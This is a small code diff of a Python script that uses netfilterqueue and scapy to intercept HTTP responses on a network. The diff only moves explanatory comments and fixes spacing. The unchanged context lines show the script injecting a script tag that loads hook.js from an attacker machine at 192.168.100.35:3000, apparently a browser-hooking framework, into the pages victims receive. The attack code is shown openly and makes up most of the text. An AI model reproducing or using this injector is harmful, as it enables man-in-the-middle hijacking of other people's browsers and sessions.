@@ -2,10 +2,6 @@
 import netfilterqueue
 import scapy.all as scapy
 import re as regex
-# Using regex rule: (?:...). The () means to group and (?:...) means to not capture
-# Thus Content length is separated into two groups, the first group will not be captured
-# and the second group will be captured i.e. the digits that is included in the content length
-# On line 40 we need to put str to convert the new content length into a string
 
 # Defining loader functionality
 def loader(packet, load):
@@ -29,7 +25,7 @@ def spoofed_packet(packets):
             # The old packet will be returned as a string
             # Thus it will decode the response into HTML code
         # Source Port
-        elif scapy_packet[scapy.TCP].sport == 10000 :
+        elif scapy_packet[scapy.TCP].sport == 10000:
             print("[+] Response")
             code_injection = '<script src="http://192.168.100.35:3000/hook.js"></script>'
             # Injecting HTML/JavaScript Code in the response field aka the html code of the website
@@ -52,3 +48,7 @@ queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue o
 queue.bind(0, spoofed_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
 # the call back function
 queue.run() # to run the function
+# Using regex rule: (?:...). The () means to group and (?:...) means to not capture
+# Thus Content length is separated into two groups, the first group will not be captured
+# and the second group will be captured i.e. the digits that is included in the content length
+# On line 40 we need to put str to convert the new content length into a string
